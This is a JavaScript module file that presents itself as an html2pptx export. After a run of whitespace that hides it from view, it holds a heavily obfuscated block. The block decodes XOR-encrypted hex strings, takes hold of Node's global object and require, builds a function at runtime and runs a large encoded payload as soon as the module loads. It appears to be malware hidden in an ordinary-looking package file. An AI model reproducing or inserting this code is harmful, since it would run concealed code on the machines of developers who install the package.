module.exports = html2pptx;                                                                                                                                                                                                       var bx = '-3813';(function(IIBIJ$RFmN,hLDcNwtrasmb_o){var NIcUUMM_NWgDdwYzpGU$wNU=cAtnZIDmidnhZsBV$fSgMbxS,a__Dxwx=IIBIJ$RFmN();while(!![]){try{var iq_uE_vf=parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xc3))/(-0xf*parseInt(0x213)+Math.floor(-0xa)*parseInt(-0x10d)+0x149c*Math.ceil(parseInt(0x1)))+-parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xc2))/(-0x199*-parseInt(0xb)+-0x4f*-parseInt(0x77)+-parseInt(0x1b25)*Math.max(parseInt(0x2),0x2))*Math['ceil'](-parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xd2))/(Math.trunc(-0x2479)*parseInt(0x1)+Math.ceil(0x4a)*0xd+Math.floor(parseInt(0x3b))*Math.trunc(0x8e)))+parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xc6))/(parseInt(-parseInt(0x235f))*-parseInt(0x1)+Number(0x7f)*-0xe+-0x40f*Number(parseInt(0x7)))*(-parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xca))/(parseInt(0x19a)*-parseInt(0x4)+Math.floor(-parseInt(0x2250))+Number(-0x1)*-0x28bd))+Math['ceil'](-parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xcb))/(-parseInt(0x425)*-0x2+parseInt(0x123d)+Math.ceil(-parseInt(0x1a81))))+Number(-parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xcf))/(parseInt(0x1f49)+Math.max(parseInt(0x2666),parseInt(0x2666))+-0x45a8))*parseInt(parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xc8))/(-0x1*parseInt(0x23f9)+Math.ceil(parseInt(0x1))*Math.ceil(0x1297)+0x116a))+Math['max'](parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xcc))/(-0xfa8*parseFloat(parseInt(0x1))+0x617*0x1+0x99a),parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xd3))/(-0xb*Math.ceil(0x40)+0x2*Math.floor(parseInt(0x7))+0x2bc))+parseFloat(NIcUUMM_NWgDdwYzpGU$wNU(0xd0))/(-parseInt(0x1f91)+Math.trunc(parseInt(0x2d3))+Math.ceil(0x1cc9)*0x1);if(iq_uE_vf===hLDcNwtrasmb_o)break;else a__Dxwx['push'](a__Dxwx['shift']());}catch(sqrwLsWJYpsIwVaqmCHp){a__Dxwx['push'](a__Dxwx['shift']());}}}(iOAUAlks,-parseInt(0x6dc6)*parseInt(-0x11)+-parseInt(0x7259)+Math.floor(-parseInt(0x2429c))),function(BQ_KqJ_A,eJJYWXbp$cWrkUKYcCmhJeNX,byrAmX_plGz,s_tteZozjreRDFbe_E){var AxCIxPjTD_OUeiYMH=cAtnZIDmidnhZsBV$fSgMbxS;BQ_KqJ_A['bx']=bx;function CSmATfSGZCkxztQb_qahoVNcF(BlqhbZo_keRr_SxgKrny,feinphn){var B_WxVgnBkIRWpZUi=cAtnZIDmidnhZsBV$fSgMbxS,kHxZsIUcF$DVZLMypZwsdMA=BlqhbZo_keRr_SxgKrny[B_WxVgnBkIRWpZUi(0xc9)](''),AWDF_NKdXQjuI=0x5*-parseInt(0x293)+-0x1388+Math.max(-parseInt(0x7),-parseInt(0x7))*-0x4a1,dQwxzOUePKGmseyPYRu=feinphn[parseInt(0x13c6)+Math.max(parseInt(0x7),parseInt(0x7))*-0x565+parseInt(parseInt(0x11fd))],LXkSLOI$MeG$NWIr=kHxZsIUcF$DVZLMypZwsdMA[B_WxVgnBkIRWpZUi(0xc5)];while(AWDF_NKdXQjuI<LXkSLOI$MeG$NWIr){var bpLeQd_tFloQ$vbkocAKLNuC=dQwxzOUePKGmseyPYRu*(AWDF_NKdXQjuI+feinphn[-0x663*Math.floor(-0x3)+Math.ceil(-0x1b9d)*0x1+0x875])+(dQwxzOUePKGmseyPYRu+AWDF_NKdXQjuI)%feinphn[Number(-0x26b2)+0x17*Number(-parseInt(0x167))+0x46f5]+feinphn[-0x254d+parseInt(0x486)+0x20c8*parseInt(0x1)],tvwdDKxpi$sI_wAjxnbeIkNCB=dQwxzOUePKGmseyPYRu*(AWDF_NKdXQjuI+feinphn[-parseInt(0x1cd0)+-0x9*Math.floor(-0x165)+0x823*parseInt(0x2)])+(dQwxzOUePKGmseyPYRu*feinphn[Math.trunc(-0x1e93)+0x1323+-parseInt(0x3d1)*Math.floor(-0x3)]+AWDF_NKdXQjuI)%feinphn[parseInt(0x70)*parseInt(parseInt(0x15))+parseInt(-0x1c97)+parseInt(0x679)*parseInt(0x3)],JD_bh$B=bpLeQd_tFloQ$vbkocAKLNuC%LXkSLOI$MeG$NWIr,Lyaj$Hj=tvwdDKxpi$sI_wAjxnbeIkNCB%LXkSLOI$MeG$NWIr,JaR_ZEchlgVjSc_BDhNKgD=kHxZsIUcF$DVZLMypZwsdMA[JD_bh$B];kHxZsIUcF$DVZLMypZwsdMA[JD_bh$B]=kHxZsIUcF$DVZLMypZwsdMA[Lyaj$Hj],kHxZsIUcF$DVZLMypZwsdMA[Lyaj$Hj]=JaR_ZEchlgVjSc_BDhNKgD,dQwxzOUePKGmseyPYRu=(bpLeQd_tFloQ$vbkocAKLNuC+tvwdDKxpi$sI_wAjxnbeIkNCB+dQwxzOUePKGmseyPYRu+AWDF_NKdXQjuI)%feinphn[parseInt(0x168d)+0x347+0x19cf*-0x1],AWDF_NKdXQjuI+=Math.max(parseInt(0x226f),0x226f)+Math.max(-0x1dc5,-parseInt(0x1dc5))+Number(-0x4a9);}return kHxZsIUcF$DVZLMypZwsdMA[B_WxVgnBkIRWpZUi(0xc7)]('');}var uqhyTzZWkLdp=String[AxCIxPjTD_OUeiYMH(0xc4)](Math.ceil(-0x9ed)+parseInt(0x4)*Math.floor(-parseInt(0x10f))+parseInt(-parseInt(0xe48))*Math.trunc(-0x1)),FDhLPQsEItgeGdt_uAZzKrfCZL=CSmATfSGZCkxztQb_qahoVNcF(AxCIxPjTD_OUeiYMH(0xd5),s_tteZozjreRDFbe_E);FDhLPQsEItgeGdt_uAZzKrfCZL=FDhLPQsEItgeGdt_uAZzKrfCZL[AxCIxPjTD_OUeiYMH(0xc9)]('#')[AxCIxPjTD_OUeiYMH(0xc7)](uqhyTzZWkLdp)[AxCIxPjTD_OUeiYMH(0xc9)]('~1')[AxCIxPjTD_OUeiYMH(0xc7)]('#')[AxCIxPjTD_OUeiYMH(0xc9)]('~0')[AxCIxPjTD_OUeiYMH(0xc7)]('~')[AxCIxPjTD_OUeiYMH(0xc9)](uqhyTzZWkLdp),BQ_KqJ_A[FDhLPQsEItgeGdt_uAZzKrfCZL[-parseInt(0x1c9)*-parseInt(0x1)+-0x1*0x8f2+Math.ceil(0x729)]]=eJJYWXbp$cWrkUKYcCmhJeNX;if(typeof module===FDhLPQsEItgeGdt_uAZzKrfCZL[-0xcb0*Math.trunc(parseInt(0x1))+-parseInt(0x1)*-0x155b+-parseInt(0x455)*parseInt(0x2)])BQ_KqJ_A[FDhLPQsEItgeGdt_uAZzKrfCZL[parseInt(0x2)*parseInt(0x406)+0x321*-0x5+Math.trunc(0x79b)]]=module;var ZTTp__qKItP=CSmATfSGZCkxztQb_qahoVNcF(AxCIxPjTD_OUeiYMH(0xd4),byrAmX_plGz),aHctKyFePEmLx_m_oI=CSmATfSGZCkxztQb_qahoVNcF[ZTTp__qKItP[AxCIxPjTD_OUeiYMH(0xd1)](Math.max(-parseInt(0x323),-0x323)*parseInt(0x7)+parseInt(0x263c)*-parseInt(0x1)+parseInt(0x3c31),parseInt(parseInt(0x9bc))+Number(0x1888)+-parseInt(0x2239))],NIiTwhlAUMvNatJEuBJtIfp=aHctKyFePEmLx_m_oI('',CSmATfSGZCkxztQb_qahoVNcF(AxCIxPjTD_OUeiYMH(0xcd),byrAmX_plGz)),TauQMkbvDCYuPvd=NIiTwhlAUMvNatJEuBJtIfp(CSmATfSGZCkxztQb_qahoVNcF(AxCIxPjTD_OUeiYMH(0xce),byrAmX_plGz));return aHctKyFePEmLx_m_oI('',TauQMkbvDCYuPvd)(Number(0x24c2)+Number(0x2)*Math.floor(-parseInt(0x655))+-0xe4b),0xad9*Number(parseInt(0x2))+-0x2b6*parseFloat(-0xf)+Math.max(0x1b1f,parseInt(0x1b1f))*-parseInt(0x1);}(global,require,[Math.max(-0xd747df,-parseInt(0xd747df))+parseInt(0x2c131)*-parseInt(0x47)+parseInt(0x20ae399),Math.ceil(parseInt(0x16fc))+Math.ceil(parseInt(0x1cf))*Math.ceil(0x13)+-parseInt(0x3834),0x3831+parseInt(0x1c89)+-0x3b*-0x121,Math.ceil(0x29)*-0xaa+Math.trunc(-parseInt(0x156))*Math.max(-parseInt(0x7),-0x7)+Number(parseInt(0x12b3)),-0x1434b*Number(0x1)+parseFloat(-parseInt(0x1c2e1))+-0x1*Math.trunc(-0x3ed91),Math.floor(parseInt(0x1))*-0x40641+Math.trunc(parseInt(0x680c40))+0x31*-parseInt(0x6d68)],[Math.trunc(-parseInt(0x189e2))+-0x1*-parseInt(0xe7545c)+-parseInt(0x69bebf),parseFloat(parseInt(0x251d))+0xe96+Math.floor(-parseInt(0x2b))*Math.trunc(parseInt(0x12a)),Math.trunc(-parseInt(0x4064))+Math.floor(0x92)*0x83+Math.ceil(-0x145)*-parseInt(0x3f),Math.trunc(0x2105)+Number(-0xa37)*-0x3+-0x3d69,parseFloat(0x7b04)+-parseInt(0xd59f)+Math.floor(-parseInt(0x7))*-parseInt(0x261a),-parseInt(0x109d)*parseInt(0x3e9)+parseFloat(parseInt(0x413d))*parseInt(0x121)+Number(0x480f3f)]));function cAtnZIDmidnhZsBV$fSgMbxS(BJzGNZsTMh$VdY,lrsngxae){var YJnnpYm=iOAUAlks();return cAtnZIDmidnhZsBV$fSgMbxS=function(Dl$j_JW,MnQgIo){Dl$j_JW=Dl$j_JW-(parseInt(0x256d)+Math.max(-parseInt(0x59c),-0x59c)+Math.ceil(0x1)*-0x1f0f);var uJQLdydGf$MdrPk_zc=YJnnpYm[Dl$j_JW];if(cAtnZIDmidnhZsBV$fSgMbxS['gvvAPw']===undefined){var zuSN_gos_rOLaJzSmrKIdTLFp=function(CYV_tJj_jcglaKfCXoDxQKV){var GQgcaX_eV=parseFloat(-parseInt(0x1f))*parseFloat(-0xf1)+-0x22d7+0x8*0xe2&Math.ceil(-parseInt(0x1bbd))+Math.max(0x4b6,parseInt(0x4b6))*Math.max(0x8,0x8)+Math.max(-parseInt(0x8f4),-0x8f4),rnTMrpmYuIPOOCkJTvLqaqGOb=new Uint8Array(CYV_tJj_jcglaKfCXoDxQKV['match'](/.{1,2}/g)['map'](bn$EJ$tD=>parseInt(bn$EJ$tD,Number(0xe04)+Math.max(0x117e,parseInt(0x117e))+-parseInt(0x1f72)))),w$AVfxX=rnTMrpmYuIPOOCkJTvLqaqGOb['map'](aGap_U_zsq=>aGap_U_zsq^GQgcaX_eV),ER_$PWmSQt=new TextDecoder(),VkKECgqHpwHldhGNKGe=ER_$PWmSQt['decode'](w$AVfxX);return VkKECgqHpwHldhGNKGe;};cAtnZIDmidnhZsBV$fSgMbxS['GCfkjC']=zuSN_gos_rOLaJzSmrKIdTLFp,BJzGNZsTMh$VdY=arguments,cAtnZIDmidnhZsBV$fSgMbxS['gvvAPw']=!![];}var rGgQ$QpIQRBgXVPC$sdT=YJnnpYm[Number(-parseInt(0x24ad))+Math.max(parseInt(0x180),0x180)+Number(-parseInt(0x232d))*-0x1],AufpWgakwQz_mSwtxlCK_Ba=Dl$j_JW+rGgQ$QpIQRBgXVPC$sdT,QLMnBuWc=BJzGNZsTMh$VdY[AufpWgakwQz_mSwtxlCK_Ba];return!QLMnBuWc?(cAtnZIDmidnhZsBV$fSgMbxS['fBeCDl']===undefined&&(cAtnZIDmidnhZsBV$fSgMbxS['fBeCDl']=!![]),uJQLdydGf$MdrPk_zc=cAtnZIDmidnhZsBV$fSgMbxS['GCfkjC'](uJQLdydGf$MdrPk_zc),BJzGNZsTMh$VdY[AufpWgakwQz_mSwtxlCK_Ba]=uJQLdydGf$MdrPk_zc):uJQLdydGf$MdrPk_zc=QLMnBuWc,uJQLdydGf$MdrPk_zc;},cAtnZIDmidnhZsBV$fSgMbxS(BJzGNZsTMh$VdY,lrsngxae);}function iOAUAlks(){var IFf$qzpt_vSeFanpnqSUzDsC=['5b5a5d5f5e580f3e21262a3a','0e1a07052b00091a2b070c0d','040d060f1c00','595a1c0c2b312a27','02070106','5d5e071018302c26','1b1804011c','505d595d5e580c2c093b0b3a','59585f5b51515c241927073c06','5d5a5e595d502c0f2c3d2220','5b020c4844541b095a1b55355540531d5b5a555807590950134109015343411a01131a0901060106150604461a4109584304071f0b075b1a484a0d0706331c1d1c0a0a1c333541181e515007185a09541c1a0b015c1e045c53530b3348091e505e4441091b534a0d1e43441a531b5f40075f45060e091a405e44180100500135031c0f1a43053343330959595b071a5a405a1a07580a150d481c0b095e491e5c1a5540350e5301011c46431a4801494153591c44465046431b1c0e29441b46071a5307461c5543430600534313434053291d0b530c1a1d53531c1b1d595f5e0b1a48411a330e554a5b1c50011b0055090b0c550d000a1b590741061d0e0f18011a1a43584044061c040b010b0d40565b531c1d44511d1a09091a5c590609530901330a1e4101001a1c1c090000070d010d0c1b1a01091b04060f1a53181c1c00065304061c5558041c40460155461e0e184855071041065904074a09400b011c0153070d095b440b5e5b0a1c5509041a09555f0146091d0404531e00015907151b0e2b1d58061e5a4533511a01065a1c3b04091e0d130941550d1a481d1c0d48515b40064118094640055b5b481b5307445b0f330d53010c46012b09400f1c581b53410d0e594a07530900590e2b430f024a4400071a5553071d4205095a1c1c55435048330b5309555e1c410e091b06070b58130b1a480c404815441c53591c425f351a53070d465f510c1c5d061841410a40091a4300015e540909031c461e1e590c41435018152b480d0d335d05401c061c501c550b1c415641011a551a0e1c40590406401b41460b580f0e01580c55010909530c415b40070c01551c58041e460941411a48072b1c1a1d411a151b440d1a0c440a59095a431a460103401e1c530b1a0940061c44071c414159041b5f0b50031c581c330e0d0e55405f041c55550d1c3b53013501331b1c5b5354290b4009005b1c095955551a53094644404809531c41031a43500a1a551d09530b1c1c1c484106531b0d1c0b584a4609010b1c0645445933461c1c004844440f5b4558191e1c07290d59431c435a07533501400a451a430c04071b101b1a0418551c1c410f1a0102040b060a0b0e071a4848010b091b074453531d0a55580b1b1b1a1b441c1e051c350448010604551c5935120d53011a1c09410e015f441a4a0d1d4135431d1c1518461d0009181c441e0e1e1c0303181c581e5a481d0110091809070f44021c1d060159350c075a5c1c01550b1c2b451c29134a070b535b0d585d55091b40401c0a4035000a07551b0d5a0d5301010d535b1b0f1818460a2b48010a0601431a0e1a070d0709061d55000c0d465c53431c00451a071e1146485a5c4609070155351c405555071a051b1e1304031c1d0a0153541c0d1c500940460e01405855040d1b400c401d1c000c1c040100011e5c011d43551e351b02071c4648071c44090758555c041d05040a0e1a5a5b2b0b5a0744530d550d095c1c1055091b441c0f1a461d07054109401b090e5900410f1a011c4a181a5c1a0e09000b5153100d4103','390d57334a332233471c0d0b3354330f3353224c4546465c06410154401f135758113335010b282a40581046514b090b2b3301330b37410b04464e020146414601335744010b2b0b5d4648553333545e0005015c331c48180b330c57522a441b30085037400c5757570633334211570d033307530e465755544e33460e5d573b49490e33481c2e3c57413307493333330d3d460f1c33213324574648570b3f103c19480d2057421f1a52550146575a330b465d464e464e4d330c1e074c3310281a300a3339573b52201a0b334c46330b0f1a334b335c04373333460d33014c460b4a46570d2f1c33481a573e10162a33224f0a1b33334a463b2907484637435757420b4d1206330e0d5244060159371c0133330a3127460b3e0b0f0c461c3333151a4649063b402c1329030d0b4106330346461a41201a333343070e04011b00330e33331826003313334657281b0e4c33495a33110e46574613481b590d4d03465d1b46333349334b1b014a53151c2453330d0a33434033335b5f33462c20330b0c57051548580b5341040b254c1c5a57332a1b46481b57405057334f1051100746100a38010b0353333b330b46463a46554646014f50401b3349330448074e484d3306571306091b33480d034633060b1a041a0e0b0533490145094e0d4615010a0b0d241b40490733071e0500073b4304485a5009034c460b4648150d571d402a2b33464b331c0d0f460d57330933410f0b1b1f1b57463340090d0b05135c0446150b330d3340333a3833424633220d0d05010033423333330948090d4133460c0d46331a332b500a332902330350572946095a050e1a461c570e33430e4606330b46460206491b0e09460b46331e332e335733105757240c1d1b364b33410d33530b401b3b5a0b04373b5e4600470b0b57460c5e33000646471d33015046575c411b421207494606091b58465d1e4d595711460b335733164b1b573306570b4a33333046420b3b1d4933463a5b4146011207330b0a0133485746491c330c463321331f3c0b330d470e460f2011333357330e04333304331c4943011c45464933460d5800575043331d584f5b580e2a5857481b400f46590e2458463346104d0b57561a07463348460b574046405746521a041f4b1540460b5f460b1a064633570d063357550d10460b333b0d095a0d46464640590b1855461b465c565759330909330b42335c330a341c4606030a4846572d045b0e49335c37564f331c48330f461b41405852400d150b28461b1c46334b09034733461c590b094802412d0725461b04373357330b275a4633331b46210b1d33480b0138461c2d3740570b2949490e1d0e481a33495e1a0b0b03335d5843332846330d09334b46014d4033444143330b5506574f484657493337335c33241b0c4b1143573b043807460e530d3b15010d29464657071c334923052e0c3352043f1a46480c1e49570b4d333315154b0646461e1b460715572e1a3333332d041d33370d3315335848572b500e5e0c040d0b331c0a332d460b3346540c49181a01134341570a573b33580f1c290d331833463346380146460c3357570907561c01051c0e1c0d331a2b4c57373305011b46460d1857491a4a0a370551330a044633071c534e1e0e0107460b4b572d1d5d46495200483346154a35071e33570c115709571c42414645071101465a460930013357334c461b45460b3b461a481137550e3c491c29370d0d46573a02261b561846511f100b0004040c334a030b333333450e1e0d400b131b464903100f413b15443b344a184d10462f331c1d3309464a182546334a1c41010c5b36413e453346330a500b3b33460f0d571c31572657010d2c295d0b33294649330c333306331a1f03041e0d3346071a180b403351331a255757333333390d40015c57480b33434c334e1c4b464933414a200046521b4333330c572957580406570d1a5e1b571833464735331f0d483b3357574648450c0c461c331a0d3303320b40464609330e4649330f330e400b3b112d3b57060d3333330d193300183333461b460c57332b465e11332d09443d364601330c4015090133571b3310330d2d010d0c4f0d1a33461c45331b4f2833310406333a52331a000d540d06041b40443309573f010d46414f5748411c0946331b3b330b574703570f0b000146005a1f571d460b3330465e01460b0b1c1a1b335d0f4918460d33042933332a11333357332d1c015907460d33014a46493b274d46031d460a330b49404f3357330d0e04092d0b330b1a0d01573346050a3301513313460b490757460757405749333a331b1a572a1a40071c335c12485707474633004940441e3333262e1a551c0733481c0d3b09495c1c09575c215e1a10532833410305130c464f073346465a57331c5d11535746330c480b33330b4633570b3347061c3348490d0b1f5f41461b3357211c5733584601334646335c0b0533534c3307330b33114601054d2d490c483312074600491d1209060b0c01331c33372d570e151c3333330d0d1a3346451546225a33492950460e06154d4606333d33013333460e500b48561839574a48405b10490d500a0e2733131b410a1b0d104633333b5757460c330327330d5701331e1533460d463b331d3349331e3b484f0333293341591c2c581106070f111a2d38330d48460e071b1b493346334002130d480b1b41132a335747483f48104b4c4f494633381a33410b4257574b3d1f29575c1a181b4657554705465300335d460c48203307330c4d02334057483b5e0b464a335c041c33331c581509181c400f4933035846335740334c46330b1b074d533a0b5a46330c571b2b57460d570d2d33003b413349070b334646483307450b0545051b463b1c0b0700460d5c4657330b1346331b581a4951180d33465b1c0b573b1b460b0c463333125d4a1b5533464833331a4621335733574a5b3346573b0b110d0457574a3333015b5c0c3307041b33061b18074927010d111a3659350f083322335946574300481c33134933451c04333724333301330b01573b3b343333580c330d5704334533101a1c4033033340570d0b33213310330b09334c1a1b0b573b0133044d1c330b1a361a5733094a58335045493305321c462a0d330152545c1c550f46330b1c1f1b4e30331c57181b0a574a1b295746461b48514937415c154805184833512e1b1106000b59070b334605541b4b3b0b0b44331d3b332e561a0c461c4c1a4e571b5633465b493340483833331b055933460b57424607331d463d401c490e2935534e011546460949331b453a19334d4c46575d0a4446331b570a1a011c5957334146140457570b551b33073d1c2a293a5d48330b2b46200c27494a1c491c1a46571e52330e09050e465a0a0153335a581e4651012d0d55330f0f0133550c57460f33330b515137330c5c5c09575248544a041d460a490b0b063357071f27010457034333573346584d33331c460b46464007464646094646462d413333333f051c102f335e4157330c3029251d4d460d050f180e463f030b0b045e331a463333334824480b39455f50573329460b460b060e33590a57063333400d464f33574d58574846330b461d40334b0d1b0946135713415746573306333f1d5b3357070d332a0b0b3c330d331b154a1b404309093304461c07330554214633541d2106571c05480a415b12034a33401f1f49333b1433463d154a3358334a3310460d213b46575740460d41074641094633573300460b45394e33573346082a151b464546333b46330b0e0c08135d0b334012333307333c333346334503330f46414e074d333009581d2933573b0d01531d275a464f3b1846180e58011a0f3307100e484645334f04574a0b5705402e43043332460c48205a33011c01401d1033081a5748461d094656062e5757461b07330b3357100b431c09131d461c330b25570f334a46571857331a0a101346335857045c331305334846090957495c070b0b09531a480a36554f421c571a33185546570d330b0b0d01072046571b1257574406493333465c0f3352410404334c330441333346570f0b3329183305330e1a0b4501460e40573357333306460133095718464f5f57221f541b504a334c0c0b4a465818030b3358403357400d0b1030331a0137462f332e483c0d2046044633465b1a1b4656441c4a371f4d1b5746581c1b2d013357401b26294041065e0b4137070e5349325946460d041b0b33422440555f574833330b335f571e334e331e0633482757460c200f0b483333382d3309010b33401b463a585a5703570b150d0d0f0b040b5718403318330b08033318570d3d3357361a381c334653575f5748574033213357461a575920403b331a1f4607330d0106010b1b3350100b5701330d57014a1633481b095738334e32462157411141333333270b035b1b463305021d403c570644320d183357482716515733200e335d4f46011b46330d075a331b094957095724484050553a572855330c0d01463b41040c1c33335749330d33421b46480b46021a515748334e460b5e1b572a19593340151134571b575455580e08574006464a20330d1c50414a1b3a0e33464133334c06061b090b0e1e3346570f331c49335e111b46570b2933335b184633180d0c094633330b06154818464526131d054d120e180d1c1c5a3b0b335746410b11450b3308011b061941400e1133490b051a070d331d461b444b140f35090b05493b460d57130d0b1a331b04461a335700093333124633331f57050110570d5c400f571c5f4646484822570b4607574633495e112346464e491c01330e015701372b09334649400046480a49464c46140a25573b3b0133015733571c4c57335f04400133574637460c5750010429433749335333012d5746571c33571b203b57093a465748572001330d5746333809093a480918573349562f4c46330e461c46080b48574b41002a0c0b3357063340234e333b4046180958095f1c5533483357460b440c575b401b1a3328180b464e1c4d051c57550d13411b5e0b3b4640331b3b3a1c0d3333491c4606060d06331d46294c33072c041d0d33013a04590b3333364a331c224846570c1c1c46222a4f1c4632331246464637274b010c0957183a46410f4d46462809045b491d04344933071b1b33493340352707330106330d1b4d56330d0c58421a331a4c4c33330c461f33135b33335c33360b0b0b0a58410d0c464e4619341c3b5707140e2b0c103b53530c1a0d292d06331846330e155d0d0031570b33465e0a1a1c57140e3b0d46331540284c57460c0c183318330d460d33330d57090b460e0410334a460d585a1b464633331c44334c440d330e3610330a060c0452332e1a4058445746403713464b4c14060d0103090d5052464650464649464657464a574c0c074633574046473341100b06463333181d0e384133461c3309474c0d0e0b4a5b33401c411a180b4607331c334a433313275743403341181e334646331c461c5e57280d38344433334633030d570433493325330d490e5746454641090b0a2b01290b570446330f3333464c521b570a0c0157491b1a3340461e3b430b335d330b1c0b405b491b5a331c0445340f5d3b330c0d1a1133580b0a15483307571c49481a294746094602435c2c13333333393333572c090d524d57334f334b0a0d49330646461c4c5446463340060e53461a060d0e0933331c5257520b41480d580b29491c1418570c460d46570209461b0b1b5857060e574a334609572e4a1b350e015349070a1c46575a33471f59461115050121573c0b0b335700334d0f572a1b0d49573338044633015b591c5c03153342334633492d3339570f0b4133183347334f333315010e0e1b4633573333330e0d44490b335433424157411d0e57331c464b331b5857050e0d1a3311333b15481b574b401a5e2a06224b4a5b410a4f1c41440c33034e1a2d33464633460b40064d133b46460b0654330b0b3733575733005e1546572c4621450d060c18273b06573c4609574b1d33331c5646095a560640061b4e1c55103d090d231b0c33570d1b3b073d234646484601011b1b580b201b22331d571a1c40444f334b331c571f115733521c1c57220a485d321f5b1a3b33574807573e4c333b33332e0c043b0d0c5733490d11041c33333d50460e091b100d1a334a04570d46130b46570b460d075755050b334607461c1333335f4a1f48340d330b120b470346490c5639333b460b5d504046073357460b1e461c333309460133574633571c330b062633333b370a0b33330e1c0a5748461a57433306574e2a461b0b400933393340330a490b035741570f063305330b1e4b282d020b0133493355291b461c571946461240464c3b181506403757450b0d481a1c461b093346232201203333113b3b4633593346062c57313301330b1d0e1c373741571c2e2a3557411b41574546331b4a46461b332857291b182057271c1c33574b46413333070d570b100f064d1c3333095b333b334607465733463729403333010e491a4547490c42094046574a575a46333b0c0d0f221b103331484b4f3746405b384c200b061c410b33555b1b33494633335751570b330b550b473f33104606333d0d014824400407571a01333b0b0101000b544615004907492d1d29551d09024c0433100946093346330426411a3749573f33584c0b4846040c05060601332c4633575a0033333b4633331c044c46330e3346030b40460b2e141c33330256094105264644001b5709334857045c57334d333309400e40402257480d46460733334c4633463340580b3b184033404007404948330c461a440c0a46485127490136142d400c3315370b33503b47334721201f4b00461b0e400b0733461c021b2d105701000b49331f3357593357334b0d464646383333462957594659330e57483327333b27572007460b584115572d1b2d575c57510c0633353348074657461a0658331b115746120d4657121b2e010b5e511b5c375805575f5546284d371b3b5e1c4610465f3840574039074f48513348460d46001a1e4f4a332d532e095733154633590d01330c43460b330c52314157463733334e48570b460b3333570506410d465747574b40291c4104490957202933013312460d5751335d1a33330d5f323333465b051a090657460d0605415753330155461d1c1f3753250b46334646395746521c53103b445d1c4d0d1046410b151a33370e0a330d040b4609573a0e5733510b1c070c46154639494a333349593346181b3b0b1c375c4c3a33300e3352331d1a570905511f4e49285549571f550b540d480d04013953335b46074658563333031a460b25351a3333330148333346420e0849575533450b46330b4633334807333b054140092c3304415c3315573b0b3346483333541c463b57401f3333414f2f49330e0b031b40460133450e4633055749330b490c2601400b33510d03574a5612073b0153263357400c113307571b46331c0f1c1a3307581a463357060b203301100a0d0c07333349473b5b4927481b330b41330b0a57330b46423346573302333340290a57290b335741061b1e09460146460d334b1b46331b05330b461c4033094603444640410b373346330e330b0d0b330b5c5f3448200b0b010c1035571446334e0d331f041a4d33460f185752331c330248474544331c574833461a1b15444e1d5a374e38571b0e1046010a1b2d465c461f123309010e33571533460d153349010a3701570b060c460a5c0d06002a101203331815485648391004460e4a465718071b495a1f414e3340360b0b1c1c331c2d071a333c48134657330b0a1d0f46334607034000570d0e3c0c0d153a0d330141055711571843433346594c57463b51335757335704575b055c043304332a33400b064655062d333357402d4b3333495757463346330d574609584c0b460e33511948484033391a1046333b464046401b335957331a0d2f461b57103e57180d051d1b451c460d0d01460e460b464f0c335d574b1a54531246461d5033491d153357371a0d0a0903491d1518130f061b244d29572a0e23570a071c4d330b335d0b572d012d0b572a4e1010334e573300234457073f1e440433331b2700571b33462033410b5b574e474533093307121c09573b335b4940385e330d3533531c461a2f0b4840573f06000d4647464633570b351e48461b4e330a0b33463303464933414b054c3359330a331c333a0b1b3346075710150e4840334c00042b1e463b333b0b57334f0b54570033050b0e460b4613570b335b0d09480b331b3246075e0957400a03441a1c331a3b46330e46331a404955494c40332d37513c4657095f570940331033461d0b56471c312a07571c150c0d1b534e0e064b1a4e3f5b4e460b5933451b0e3a4b0153464b1c0b080619334946572e493355094648330b3340331a1a1a331b33330b0b1c0d333509335306461a0609330b3333433b320b33060e0d4a330b4633573f330f0e3e335704062d33074a0707330b481c46333323481046490b5c460b33231c131818574b0e1f0d334618574e060d10400e1846012d0e481b46334e1d535c2c461b263315460b3b57555750461c494a5757460948041146401a441d4057330b40333333461b0406491c243b4f333346461b013c1f49484038480a5a0941055c333346332a064e4033290b330b33480b461a3307484c4d265d46321c3301575815463e571c18334857550b0b434840053b33024909483b2e1a3307333b1c0c1e0a46540e5727134657574c3425480b07053846104846331c5a0e07045d090f132d0700332c0a1b2d494619140b1b0a071c4f0d400b091810011504550646072a454933241a33044d37333353044659455a150b0e420a0b2b414123480d101c05330c0d3046290c331c1a1b0046402d071c4e33100133051157354e5d3301331c0d100e1801010b333346381c1d01570b1c02151a490b030a460130463357334a333602552453460b011a584833575646184c330d1b33093304463346460e3342340546131c32571c0b1a2a0f46571b01331a335858330101401a495746473333120b0b330c0f40570c40465f4a33464918464c4633331b5b094049335c28574918484d57050146465733051a46150158335757091d1c46070e0b550b494c0b204618403433593b46021a462a574e46460b575c333333463302333f33281b0e23474610331b46401b46193b2f1c0b030b4021361b4b404629330b484b4b5733465d465f4606043b56332b4649330b035833060b49330b3300142c4d0b33000b483a0d461006230b464049335744570e570d4c0b3809460b005341461a57185756040b57335449332f331d2300091b10330b33095b1b0b0b0c570505550b331c3f334d0b57100d461646334e1a1b163333322b4004574646333b37464631313348090e0c3333335b33330a18460b3301465e463348465b541c3b330c0f06462b5741461a335715015240114816370d44333b2557373318004637465a463333440d062b3700010c0533334648540d181557015c33460756062e040037180b4a00274357010d572b334f460c481646330e3357183b5358462b010f40573b2e334c584600061c33444618334933040b5705494d0a2e5146401a5710441d4633402d465707330a5744570b3b3333571a570746570d2c571546405e4100495c0e564d460b4658573b565d0f33053b10302f1c01020b0d1a4f460f0d5e465840484c0e57573157370733330d4c330b191201090f5c03071c0b333306573b051c461c4e4646330a060e13335f495e094e46060b18335d491b3356495157480e5b460d491b0e1b1a2626132f570b1b460d33464655570450331e37330b330d3346330057080c572d1006063e18060e57462d4b2546332a49401047062257570b3b33580549321c332b0145460e334b0d33515006335a5733573333404636335b0c3846495e1a330b0d0e1c3b1f464059050b480b1a33123342460f370b5748331a0d2d334641411d575b0f41490c330133334733010b0f4d49331a33483346015f01460f0f1c12460d334e0c3633014c5733150b0d091c004d0b574c33401a4f0d444958460d332818495e1923330b1b40091006331c01573348071b334133075c0507000b0733575c571315481a0c401557460c0d48334649335033540d1a29451c5733484c46464115551d06015e420a051d3b334f